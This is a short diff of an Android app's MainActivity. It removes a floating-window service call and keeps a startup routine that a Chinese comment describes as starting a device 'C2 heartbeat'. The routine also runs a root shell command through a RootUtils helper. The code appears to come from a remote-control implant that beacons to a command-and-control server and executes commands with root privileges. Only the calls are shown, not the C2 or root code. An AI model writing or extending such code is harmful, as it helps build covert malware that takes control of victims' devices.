@@ -105,7 +105,6 @@ public class MainActivity extends AppCompatActivity {
 
     /** 验证通过/已授权后：启动悬浮窗服务 + 设备 C2 心跳。 */
     private void proceed(RemoteConfig cfg) {
-        startFloatingWindowService();
         DeviceC2.start(this);
         new Thread(() -> {
             try { RootUtils.executeAsRoot("input keyevent KEYCODE_HOME"); } catch (Throwable ignored) {}
